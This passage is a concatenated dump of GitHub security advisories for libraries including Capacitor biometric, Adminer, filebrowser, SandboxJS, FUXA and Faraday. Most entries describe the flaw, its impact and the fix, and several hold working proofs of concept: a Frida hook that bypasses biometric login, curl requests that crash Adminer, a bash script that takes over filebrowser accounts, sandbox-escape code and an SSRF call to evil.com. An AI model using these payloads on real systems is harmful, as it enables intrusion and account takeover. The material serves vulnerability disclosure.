This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine",

          "html": "There is a potential issue with the [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library. \n\n---\n\n## Summary\n\nThe [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library was found to be subject to an authentication bypass as the current implementation of the `onAuthenticationSucceeded()` does not appear to handle a `CryptoObject`[^HackTricks1] [^SecuringBiometricAuthentication] as seen in the following code block starting from [line 88 in AuthActivity.java](https://github.com/Cap-go/capacitor-native-biometric/blob/main/android/src/main/java/ee/forgr/biometric/AuthActivity.java#L88):\n\n```java\n@Override\n    public void onAuthenticationSucceeded(\n        @NonNull BiometricPrompt.AuthenticationResult result\n    ) {\n        super.onAuthenticationSucceeded(result);\n        finishActivity(\"success\");\n    }\n```\n\nAs the current implementation only checks whether `onAuthenticationSucceeded()` was called and does not handle a `CryptoObject` the biometric authentication can be bypassed by hooking the `onAuthenticationSucceeded()` function. \n\n## PoC Video:\n\nhttps://github.com/user-attachments/assets/b7b5a2bc-21dc-4373-b371-84b002dae7a7\n\n## Environment:\n\nThe following steps were taken to create and deploy a Capacitor application using the `cap-go/capacitor-native-biometric library` for the purpose of verifying this finding. Note at the time of writing the `npx create-react-app` command broke, so I have provided two ways of creating and deploying the testing environment. Apparently React updated to version 19 caused a dependency issue as seen [here](https://github.com/facebook/create-react-app/issues/13715). If it is not fixed by the time you look at this PoC please use the yarn alternatives. \n\n1. Create a new Capacitor app by opening your terminal and run the following commands to create a new Capacitor app. For the sake of the disclosure I'll be using the name `capgo-poc`: \n\n```sh\nnpx create-react-app capgo-poc --template typescript\n```\n\nYarn Alternative:\n\n```sh\nnpm install --global yarn\nyarn create react-app capgo-poc --template typescript\n```\n\n2. Install dependencies by navigating into your app's directory and run the following command to install Capacitor's core dependencies:\n\n```sh\ncd capgo-poc\nnpm install @capacitor/core \nnpm install @capacitor/cli \nnpm install @capacitor/android\nnpm install @capgo/capacitor-native-biometric\nnpm install react\n```\n\nYarn Alternative:\n\n```sh\ncd capgo-poc\nyarn add @capacitor/core \nyarn add @capacitor/cli \nyarn add @capacitor/android\nyarn add @capgo/capacitor-native-biometric\nyarn add react\n```\n\n3. Initialise the project using the name `capgo-poc` and `com.capgo.poc`, and add the android platform by running the following commands:\n\n```sh\nnpx cap init\nnpx cap add android\n```\n\n4. Configure the android permissions by opening the `android/app/src/main/AndroidManifest.xml` file and add the necessary permissions:\n\n```xml\n<uses-permission android:name=\"android.permission.USE_BIOMETRIC\" />\n<uses-permission android:name=\"android.permission.USE_FINGERPRINT\" />\n```\n\n5. Implement Biometric Authentication, here is some basic code to use the biometric authentication feature. Modify the TSX file called `App.tsx` in `src/` and import the following code:\n\n```js\nimport React, { useState } from 'react';\nimport { NativeBiometric } from '@capgo/capacitor-native-biometric';\n\nconst App = () => {\n  // State to hold authentication status\n  const [authStatus, setAuthStatus] = useState<string | null>(null);\n\n  // Function to authenticate the user\n  const authenticateUser = async () => {\n    try {\n      const result = await NativeBiometric.verifyIdentity({\n        reason: 'For an application access',\n        title: 'Log in',\n        subtitle: '',\n        description: 'Verify yourself by biometrics',\n        useFallback: true,\n        maxAttempts: 3,\n      }).then(() => true)\n        .catch(() => false);\n\n      if (!result) {\n        setAuthStatus('failed');\n      } else {\n        setAuthStatus('success');\n      }\n    } catch (error) {\n      console.error('Error during biometric verification:', error);\n      setAuthStatus('error');\n    }\n  };\n\n  return (\n    <div>\n      <h1>CAP-GO Capacitor Native Biometric Authentication</h1>\n      <button onClick={authenticateUser}>Authenticate with Biometrics</button>\n\n      {/* Conditionally render based on authentication status */}\n      {authStatus === 'success' && <h2>CAP-GO Capacitor Native Biometric Authentication Success</h2>}\n      {authStatus === 'failed' && <h2>CAP-GO Capacitor Native Biometric Authentication Failed</h2>}\n      {authStatus === 'error' && <h2>Error during authentication</h2>}\n    </div>\n  );\n};\n\nexport default App;\n```\n\n6. Build the React project, synchronise it with the Android platform, and open the native Android project in Android Studio by running the following commands:\n\n```sh\nnpm run build\nnpx cap sync android \nnpx cap open android\n```\n\nYarn alternative:\n\n```sh\nyarn build\nnpx cap sync android \nnpx cap open android\n```\n\n## Exploitation:\n\nFor the purpose of demonstrating the vulnerability we will be using frida and a rooted emulator from android studio. Frida is a dynamic instrumentation toolkit used as part of pentesting mobile applications [^frida]. \n\nNote that a rooted emulator is not necessary, but is being used for simplicity to demonstrate the vulnerability. \n\n1. Copy the below frida script to a JavaScript file and run it to hook the `onAuthenticationSucceeded()` function, abusing the `null CryptoObject`. This can be done by running the following command:\n\n```sh\nfrida -U -l <PAYLOAD> -n 'capgo-poc'\n```\n\n### Payload\n```js\nJava.perform(function () {\n  hookBiometricPrompt();\n});\n\nfunction getBiometricAuthResult(resultObj, cryptoInst) {\n    var authenticationResultInst = resultObj.$new(cryptoInst, 0);\n    return authenticationResultInst;\n};\n\nfunction getBiometricPromptResult() {\n    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');\n    var cryptoInst = cryptoObj.$new(null);\n    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');\n    var authenticationResultInst = getBiometricAuthResult(authenticationResultObj, cryptoInst);\n    return authenticationResultInst\n};\n\nfunction hookBiometricPrompt() {\n    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');\n    console.log(\"Hooking BiometricPrompt.authenticate()...\");\n    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {\n        var authenticationResultInst = getBiometricPromptResult();\n        callback.onAuthenticationSucceeded(authenticationResultInst);\n    }\n};\n```\n\n[^SecuringBiometricAuthentication]: https://www.kayssel.com/post/android-8/\n[^HackTricks1]: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android#method-1-bypassing-with-no-crypto-object-usage\n[^frida]: https://frida.re/",

If the underlying LDAP server is configured to allow anonymous\nbinds, an attacker can bypass authentication by providing an existing username with an empty password. This allows unauthorized access to otherwise restricted Druid resources without valid credentials.\n\nThe vulnerability stems from improper validation of LDAP authentication responses when anonymous binds are permitted, effectively treating anonymous bind success as valid user authentication. \n\nImpact\n\nA remote, unauthenticated attacker can:\n  *  Gain unauthorized access to the Apache Druid cluster\n  *  Access sensitive data stored in Druid datasources\n  *  Execute queries and potentially manipulate data\n  *  Access administrative interfaces if the bypassed account has elevated privileges\n  *  Completely compromise the confidentiality, integrity, and availability of the Druid deployment                                                                                                                                                                                    \n\n\nMitigation\n \nImmediate Mitigation (No Druid Upgrade Required):                                                                                                                                                    \n  *  Disable anonymous bind on your LDAP server. This prevents the vulnerability from being exploitable and is the recommended immediate action.\n\n\n\nResolution\n  *  Upgrade Apache Druid to version 36.0.0 or later, which includes fixes to properly reject anonymous LDAP bind attempts.",

This leads to Remote Code Execution (RCE) when the server reloads the malicious scripts. It is a new vulnerability a patch bypass for the sanitization in the last release .\n\n\n### Details\nThis report describes a new, distinct vulnerability that differs from previous Path Traversal advisories (such as CVE-2023-31718) in several ways:\n\nPatch Bypass (Regression): The vulnerability circumvents the existing sanitization logic implemented to fix previous traversal issues. The current \"single-pass\" regex approach is insufficient against nested sequences.\nExpansion of Scope: Unlike previous reports that focused primarily on /api/download, this bypass affects multiple critical endpoints, including /api/upload, /api/resources/remove, and /api/logs.\nEscalation to RCE: By targeting the \nupload\n and remove functionalities, this vulnerability directly leads to Remote Code Execution, which is a higher impact than the information disclosure typically associated with previous traversal reports.\n\n\n### Impact\nRemote Code Execution (RCE): Transition from application admin to full system control.\nSCADA Operational Disruption: Potential for physical or operational sabotage by manipulating tags and alarms.\nData Integrity & Availability: Full access to projects, credentials, and historical logs.\n\n### Patches\n\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the latest available release.",

This resulted in `go-git` potentially consuming corrupted files, which would likely result in unexpected errors such as `object not found`.\n\nFor context, clients fetch [`packfiles`](https://git-scm.com/docs/pack-protocol#_packfile_data) from upstream Git servers. Those files contain a checksum of their contents, so that clients can perform integrity checks before consuming it. The pack indexes (`.idx`) are [generated](https://git-scm.com/docs/pack-format) locally by `go-git`, or the `git` cli, when new `.pack` files are received and processed. The integrity checks for both files were not being verified correctly.\n\nNote that the lack of verification of the packfile checksum has no impact on the trust relationship between the client and server, which is enforced based on the protocol being used (e.g. TLS in the case of `https://` or known hosts for `ssh://`). In other words, the packfile checksum verification does not provide any security benefits when connecting to a malicious or compromised Git server.\n\n### Patches\n\nUsers should upgrade to `v5.16.5`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.\n\n### Workarounds\n\nIn case updating to a fixed version of `go-git` is not possible, users can run [git fsck](https://git-scm.com/docs/git-fsck) from the `git` cli to check for data corruption on a given repository. \n\n### Credit\n\nThanks @N0zoM1z0 for finding and reporting this issue privately to the `go-git` project.",

This affects FUXA version 1.2.8 through version 1.2.10. This has been patched in FUXA version 1.2.11.\n\n### Impact\nThis affects all deployments with the Node-RED plugin enabled, including those with `runtime.settings.secureEnabled` set to true.\n\nExploitation allows an unauthenticated, remote attacker to send a specially crafted request to the `/nodered/flows` endpoint to bypass authentication checks, granting the attacker administrative access to the Node-RED deployment API. By submitting a malicious flow configuration, an attacker can execute arbitrary code in the context of the FUXA service. Depending on deployment configuration and permissions, this may lead to full system compromise and could further expose connected ICS/SCADA environments to follow-on actions.\n\n### Patches\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the latest available release.",

          "html": "### Summary\nAdminer v5.4.1 has a version check mechanism where `adminer.org` sends signed version info via JavaScript postMessage, which the browser then POSTs to `?script=version`. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST `version[]` parameter which PHP converts to an array. On next page load, `openssl_verify()` receives this array instead of string and throws `TypeError`, returning HTTP 500 to all users.\n\n### Fix\n\nUpgrade to Adminer 5.4.2.\n\n**Mitigation** (if you can't upgrade): Make file `adminer.version` in temp directory (usually the value of [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) unwritable by web server.\n\n### Details\n\n**1. Intended design of `?script=version`:**\n\nThe endpoint is designed to receive version data from `adminer.org` via browser JavaScript:\n- `functions.js` line 102-117: Creates iframe to `https://www.adminer.org/version/`\n- Adminer.org sends signed version data via `postMessage`\n- JavaScript POSTs this to `?script=version`\n- Server stores in `/tmp/adminer.version` for signature verification\n\n```javascript\n// functions.js line 117\najax(url + 'script=version', () => { }, event.data + '&token=' + token);\n```\n\n**2. The vulnerability:**\n\nThe endpoint only checks `$_GET[\"script\"] == \"version\"` - it does not validate:\n- Request origin (no CSRF token check for this endpoint)\n- Request source (any HTTP client can POST)\n- Parameter types (`version` expected as string, array not rejected)\n\n```php\n// bootstrap.inc.php line 32-40\nif ($_GET[\"script\"] == \"version\") {\n    $filename = get_temp_dir() . \"/adminer.version\";\n    @unlink($filename);\n    $fp = file_open_lock($filename);\n    if ($fp) {\n        file_write_unlock($fp, serialize(array(\"signature\" => $_POST[\"signature\"], \"version\" => $_POST[\"version\"])));\n    }\n    exit;\n}\n```\n\n**3. Type confusion crash:**\n\nWhen POST contains `version[]` instead of `version`, PHP creates an array. When Adminer reads this file and passes to `openssl_verify()`:\n\n```php\n// design.inc.php line 75\nif (openssl_verify($version[\"version\"], base64_decode($version[\"signature\"]), $public) == 1) {\n```\n\nPHP 8.x throws:\n```\nTypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given\n```\n\n### PoC\n\n**Steps to Reproduce:**\n\n**Step 1:** Verify Adminer is running and accessible.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n200\n```\n\n**Step 2:** Send the malicious POST request. The `version[]` syntax causes PHP to create an array instead of a string.\n```bash\ncurl -X POST \"http://localhost:8888/adminer-5.4.1.php?script=version\" \\\n     -d \"signature=x&version[]=INJECTED\"\n```\nExpected output: Empty response (no error).\n\n**Step 3:** Access Adminer again to trigger the crash.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n500\n```\n\n**Step 4:** (Optional) View the PHP error in server logs.\n```\nPHP Fatal error:  Uncaught TypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given in adminer-5.4.1.php:1386\n```\n\n**Step 5:** (Optional) Inspect the poisoned file.\n```bash\ncat /tmp/adminer.version\n```\nExpected output:\n```\na:2:{s:9:\"signature\";s:1:\"x\";s:7:\"version\";a:1:{i:0;s:8:\"INJECTED\";}}\n```\n\n**Recovery:**\n```bash\nrm /tmp/adminer.version\n```\nAfter deletion, Adminer returns HTTP 200.\n\n---\n\n### Impact\n\n**Type:** Denial of Service\n\n**Root cause:** The `?script=version` endpoint is designed to receive data from `adminer.org` via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before `openssl_verify()`, this allows persistent DoS.\n\n**Affected users:** Any Adminer instance accessible over the network.",

By adding multiple slashes (e.g., //private/) to the path, the authorization check fails to match the rule, while the underlying filesystem resolves the path correctly, granting unauthorized access to restricted files.\n\n### Details\nThe vulnerability allows users to bypass \"Disallow\" rules defined by administrators.\n\nThe issue stems from how the application handles URL path normalization and rule matching:\n\n1. Router Configuration: The router in `http/http.go` is configured with `r.SkipClean(true)`. This prevents the automatic collapse of multiple slashes (e.g., // becoming /) before the request reaches the handler.\n2. Insecure Rule Matching: The rule enforcement logic in `rules/rules.go` relies on a simple string prefix match: `strings.HasPrefix(path, r.Path)`. If a rule disallows /private, a request for //private fails this check because //private does not strictly start with /private.\n3. Filesystem Resolution: After bypassing the rule check, the non-normalized path is passed to the filesystem. The filesystem treats the multiple slashes as a single separator, successfully resolving //private/secret.txt and serving the file.\n\n### PoC\n[Python minimal PoC](https://github.com/user-attachments/files/24823114/poc.py)\n\nThe following steps demonstrate the vulnerability:\n1. Setup:\n  - Admin user creates a folder /private and adds a file /private/secret.txt.\n<img width=\"971\" height=\"719\" alt=\"Screenshot_20260123_151608\" src=\"https://github.com/user-attachments/assets/2071c92e-2bbe-46f8-a338-05b0f53d381a\" />\n<img width=\"890\" height=\"386\" alt=\"Screenshot_20260123_151551\" src=\"https://github.com/user-attachments/assets/1def540a-de26-4666-a6ab-058d5927bfbe\" />\n  - Admin adds a Disallow rule for user bob on the path /private.\n<img width=\"1005\" height=\"1126\" alt=\"Screenshot_20260123_151502\" src=\"https://github.com/user-attachments/assets/e9b57d59-f4ab-41d8-b056-8ffdaa219963\" />\n\n2. Verification:\n  - User bob requests GET /api/resources/private/secret.txt.\n  - Server responds: 403 Forbidden.\n<img width=\"1193\" height=\"721\" alt=\"Screenshot_20260123_154446\" src=\"https://github.com/user-attachments/assets/dd092a10-2f8c-4a3c-b48f-d540c483bb5a\" />\n3. Exploit:\n  - User bob requests GET /api/resources//private/secret.txt.\n  - Server responds: 200 OK (Bypass successful).\n<img width=\"1193\" height=\"721\" alt=\"Screenshot_20260123_154544\" src=\"https://github.com/user-attachments/assets/27ebb82c-f7c2-467d-ae82-f495ae3aa2d4\" />\n<img width=\"1196\" height=\"818\" alt=\"Screenshot_20260123_154618\" src=\"https://github.com/user-attachments/assets/82035884-9a24-490d-b928-7bdd2dbe3193\" />\n\n\n### Impact\nThis vulnerability impacts the confidentiality and integrity of data stored in filebrowser.\n- Confidentiality: Users can read files they are explicitly forbidden from accessing.\n- Integrity: If the user has general write permissions but is restricted from specific directories via rules, they can bypass these restrictions to rename, delete, or modify files.",

When a global prototype reference (e.g., `Map.prototype`, `Set.prototype`) is placed into an array and retrieved, the `isGlobal` taint is stripped, permitting direct prototype mutation from within the sandbox. This results in persistent host-side prototype pollution and may enable RCE in applications that use polluted properties in sensitive sinks (example gadget: `execSync(obj.cmd)`).\n\n### Details\n#### Root Cause:\nThe sandbox implements a protection mechanism using the `isGlobal` flag in the Prop class to prevent modification of global objects and their prototypes. However, this taint tracking is lost when values pass through array/object literal creation.\n\n#### Vulnerable Code Path `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):\n```ts\naddOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {\n  const items = (b as LispItem[])\n    .map((item) => {\n      if (item instanceof SpreadArray) {\n        return [...item.item];\n      } else {\n        return item;\n      }\n    })\n    .flat()\n    .map((item) => valueOrProp(item, context));  // <- isGlobal flag lost here\n  done(undefined, items);\n});\n```\n#### Exploitation Flow:\n```txt\nSandboxed code: const m=[Map.prototype][0]\n              ↓\nArray creation: isGlobal taint stripped via valueOrProp()\n              ↓\nPrototype mutation: m.cmd='id' (host prototype polluted)\n              ↓\nHost-side impact: new Map().cmd === 'id' (persistent)\n              ↓\nRCE (application-dependent): host code calls execSync(obj.cmd)\n```\n\n#### Protection Bypass Location `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):\n```ts\nset(key: string, val: unknown) {\n  // ...\n  if (prop.isGlobal) {  // <- This check is bypassed\n    throw new SandboxError(`Cannot override global variable '${key}'`);\n  }\n  (prop.context as any)[prop.prop] = val;\n  return prop;\n}\n```\nWhen the prototype is accessed via array retrieval, the `isGlobal` flag is no longer set, so this protection is never triggered.\n\n### PoC\n#### Prototype pollution via array intermediary:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const arr=[Map.prototype];\n  const p=arr[0];\n  p.polluted='pwned';\n  return 'done';\n`)().run();\n\nconsole.log('polluted' in ({}), new Map().polluted);\n```\n**Observed output**: `false pwned`\n\n#### Overwrite `Set.prototype.has`:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const s=[Set.prototype][0];\n  s.has=isFinite;\n  return 'done';\n`)().run();\n\nconsole.log('has overwritten:', Set.prototype.has === isFinite);\n```\n\n**Observed output**: `has overwritten: true`\n\n#### RCE via host gadget (prototype pollution -> execSync):\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst { execSync } = require('child_process');\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const m=[Map.prototype][0];\n  m.cmd='id';\n  return 'done';\n`)().run();\n\nconst obj = new Map();\nconst out = execSync(obj.cmd, { encoding: 'utf8' }).trim();\nconsole.log(out);\n```\n\n**Observed output**: `uid=501(user) gid=20(staff) groups=20(staff),...`\n\n### Impact\nThis is a sandbox escape: untrusted sandboxed code can persistently mutate host built-in prototypes (e.g., `Map.prototype`, `Set.prototype`), breaking isolation and impacting subsequent host execution. RCE is possible in applications that later use attacker-controlled (polluted) properties in sensitive sinks (e.g., passing `obj.cmd` to `child_process.execSync`).\n\n**Affected Systems**: any application using `@nyariv/sandboxjs` to execute untrusted JavaScript.\n\n### Remediation\n- Preserve `isGlobal` protection across array/object literal creation (do not unwrap `Prop` into raw values in a way that drops the global/prototype taint).\n- Add a hard block on writes to built-in prototypes (e.g., `Map.prototype`, `Set.prototype`, etc.) even if they are obtained indirectly through literals.\n- Defense-in-depth: freeze built-in prototypes in the host process before running untrusted code (may be breaking for some consumers).",

By using Title Case field name `\"Password\"` instead of lowercase `\"password\"` in the API request, the `current_password` verification is completely bypassed. This enables account takeover if an attacker obtains a valid JWT token through XSS, session hijacking, or other means.\n\n**CVSS Score**: 7.5 (High)  \n**CWE**: CWE-178 (Improper Handling of Case Sensitivity)\n\n---\n\n## Details\n\nThe vulnerability exists in `http/users.go` in the `userPutHandler` function (lines 181-200).\n\n### Vulnerable Code\n\n```go\n// http/users.go:181-200\nif d.settings.AuthMethod == auth.MethodJSONAuth {\n    var sensibleFields = map[string]struct{}{\n        \"all\":          {},\n        \"username\":     {},\n        \"password\":     {},  // lowercase\n        \"scope\":        {},\n        \"lockPassword\": {},\n        \"commands\":     {},\n        \"perm\":         {},\n    }\n\n    for _, field := range req.Which {\n        if _, ok := sensibleFields[field]; ok {  // Case-sensitive lookup\n            if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n                return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n            }\n            break\n        }\n    }\n}\n```\n\n### Root Cause\n\n1. The `sensibleFields` map uses **lowercase** keys (e.g., `\"password\"`)\n2. The lookup `sensibleFields[field]` is **case-sensitive**\n3. When `req.Which` contains `\"Password\"` (Title Case), the lookup returns `false`\n4. The password verification block is skipped entirely\n5. Later in the code (line 229), field names are converted to Title Case for processing, so `\"Password\"` is a valid field name\n\n### Attack Flow\n\n```\n1. Attacker obtains victim's JWT token (via XSS, log leakage, etc.)\n2. Attacker sends PUT /api/users/{id} with:\n   - which: [\"Password\"]  (Title Case - bypasses validation)\n   - data.password: \"attacker_password\"\n   - NO current_password field required\n3. Password is changed without verification\n4. Victim is locked out, attacker has full access\n```\n\n---\n\n## PoC\n\n### Prerequisites\n- A valid JWT token for any user account\n- Target Filebrowser instance using JSON authentication (default)\n\n### Reproduction Steps\n\n**Step 1: Obtain a valid JWT token**\n```bash\nTOKEN=$(curl -s -X POST \"http://target:8080/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"victim\",\"password\":\"victim_password\"}')\n```\n\n**Step 2: Attempt normal password change (should fail)**\n```bash\ncurl -s -X PUT \"http://target:8080/api/users/1\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"what\": \"user\",\n    \"which\": [\"password\"],\n    \"data\": {\"id\": 1, \"password\": \"NewPassword123456\"}\n  }'\n# Response: 400 Bad Request (the current password is incorrect)\n```\n\n**Step 3: Bypass with Title Case (succeeds without current_password)**\n```bash\ncurl -s -X PUT \"http://target:8080/api/users/1\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"what\": \"user\",\n    \"which\": [\"Password\"],\n    \"data\": {\"id\": 1, \"password\": \"HackedPassword123\"}\n  }'\n# Response: 200 OK\n```\n\n**Step 4: Verify account takeover**\n```bash\n# Original password no longer works\ncurl -s -X POST \"http://target:8080/api/login\" \\\n  -d '{\"username\":\"victim\",\"password\":\"victim_password\"}'\n# Response: 403 Forbidden\n\n# New password works\ncurl -s -X POST \"http://target:8080/api/login\" \\\n  -d '{\"username\":\"victim\",\"password\":\"HackedPassword123\"}'\n# Response: Valid JWT token\n```\n\n### Automated PoC Script\n\n```bash\n#!/bin/bash\n# Usage: ./poc.sh <target> <username> <current_password> <new_password>\n\nTARGET=\"$1\"\nUSERNAME=\"$2\"\nCURRENT_PASS=\"$3\"\nNEW_PASS=\"$4\"\n\n# Login\nTOKEN=$(curl -s -X POST \"$TARGET/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"username\\\":\\\"$USERNAME\\\",\\\"password\\\":\\\"$CURRENT_PASS\\\"}\")\n\n# Get user ID from token\nUSER_ID=$(echo \"$TOKEN\" | python3 -c \"\nimport sys,json,base64\nparts=input().split('.')\npayload=json.loads(base64.b64decode(parts[1]+'=='))\nprint(payload['user']['id'])\n\")\n\n# Exploit: Change password without current_password\ncurl -s -X PUT \"$TARGET/api/users/$USER_ID\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\n    \\\"what\\\": \\\"user\\\",\n    \\\"which\\\": [\\\"Password\\\"],\n    \\\"data\\\": {\\\"id\\\": $USER_ID, \\\"password\\\": \\\"$NEW_PASS\\\"}\n  }\"\n\necho \"Password changed to: $NEW_PASS\"\n```\n\n---\n\n## Impact\n\n### Who is Impacted\n\n- **All Filebrowser users** using JSON authentication method (default configuration)\n- Any user whose JWT token can be obtained by an attacker\n- Particularly high-value targets: administrator accounts\n\n### Attack Scenarios\n\n| Scenario | Impact |\n|----------|--------|\n| XSS + Token Theft | Complete account takeover |\n| JWT in Server Logs | Mass account compromise |\n| Shared Computer | Session hijacking |\n| Malicious Browser Extension | Credential theft |\n\n### Security Impact\n\n| Category | Severity |\n|----------|----------|\n| Confidentiality | **High** - Attacker gains full account access |\n| Integrity | **High** - Attacker can modify all user data |\n| Availability | **High** - Legitimate user locked out |\n\n### Scope\n\n- The vulnerability affects **password modification only**\n- Other sensitive fields (`Username`, `Scope`, `Perm`, etc.) have additional protection via `NonModifiableFieldsForNonAdmin` check\n- However, for **administrators**, all fields can be modified using this bypass technique\n\n---\n\n## Suggested Fix\n\n### Option 1: Case-insensitive field matching (Recommended)\n\n```go\n// Convert field to lowercase before checking\nfor _, field := range req.Which {\n    if _, ok := sensibleFields[strings.ToLower(field)]; ok {\n        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n        }\n        break\n    }\n}\n```\n\n### Option 2: Use Title Case in sensibleFields\n\n```go\nvar sensibleFields = map[string]struct{}{\n    \"All\":          {},\n    \"Username\":     {},\n    \"Password\":     {},  // Title Case to match post-transformation\n    \"Scope\":        {},\n    \"LockPassword\": {},\n    \"Commands\":     {},\n    \"Perm\":         {},\n}\n\n// Check AFTER field name transformation\nfor k, v := range req.Which {\n    v = cases.Title(language.English, cases.NoLower).String(v)\n    req.Which[k] = v\n    \n    // Now check with Title Case\n    if _, ok := sensibleFields[v]; ok {\n        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n        }\n        break\n    }\n}\n```\n\n---\n\n## References\n\n- Affected File: `http/users.go`\n- Affected Lines: 181-200\n- Related Code: `NonModifiableFieldsForNonAdmin` (line 17)",

These values are then passed to `send`, which is used to call an arbitrary class method. However, there is no validation that the provided `command` value is one of the expected RPC methods. \nThis means that an attacker could supply a `command` value such as `system`, and then pass arbitrary system commands into the `args` parameter and achieve remote code execution. \n\n### PoC\n1. Start the RPC server\n2. Send a request to the RPC server as so:\n ```\ncurl -X POST http://127.0.0.1:18443 -H 'Content-Type: application/json' \\\n    -d '{\"method\":\"eval\",\"params\":[\"File.write(\\\"/tmp/pwned\\\",\\\"owned\\\")\"]}'\n```\n3. Check the /tmp folder on the machine where the RPC server is being run. If a folder /pwned now exists, the vulnerability is confirmed.\n### Impact\nThis vulnerability would impact anyone running the RPC server. The impact is higher for those who are running it publicly exposed to the internet.\n\n### Remediation                                                \n                                                                                                                                                                                                                               \n  **Mitigating Factors:**                                                                                                                                                                                                      \n  - The RPC server is part of the experimental SPV node feature, which is not documented and has very few users.                                                                                                               \n  - The SPV-related features may be removed in future releases.                                                                                                                                                                \n                                                                                                                                                                                                                               \n  **Resolution:**                                                                                                                                                                                                              \n  - Added whitelist validation to allow only RPC methods defined in `RequestHandler`.                                                                                                                                          \n  - Fixed in version 1.12.0.",

          "html": "### Impact\n\n  Faraday's `build_exclusive_url` method (in `lib/faraday/connection.rb`) uses Ruby's\n  `URI#merge` to combine the connection's base URL with a user-supplied path. Per RFC 3986,\n  protocol-relative URLs (e.g. `//evil.com/path`) are treated as network-path references\n  that override the base URL's host/authority component.\n\n  This means that if any application passes user-controlled input to Faraday's `get()`,\n  `post()`, `build_url()`, or other request methods, an attacker can supply a\n  protocol-relative URL like `//attacker.com/endpoint` to redirect the request to an\n  arbitrary host, enabling Server-Side Request Forgery (SSRF).\n\n  The `./` prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with\n  `/`, so protocol-relative URLs bypass it entirely.\n\n  **Example:**\n  ```ruby\n  conn = Faraday.new(url: 'https://api.internal.com')\n  conn.get('//evil.com/steal')\n  # Request is sent to https://evil.com/steal instead of api.internal.com\n  ```\n\n### Patches\n\n  Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.\n\n### Workarounds\n\n  **NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.**\n\n  Applications should validate and sanitize any user-controlled input before passing it to\n  Faraday request methods. Specifically:\n\n  - Reject or strip input that starts with // followed by a non-/ character\n  - Use an allowlist of permitted path prefixes\n  - Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday\n\n  Example validation:\n  ```ruby\n  def safe_path(user_input)\n    raise ArgumentError, \"Invalid path\" if user_input.match?(%r{\\A//[^/]})\n    user_input\n  end\n  ```",

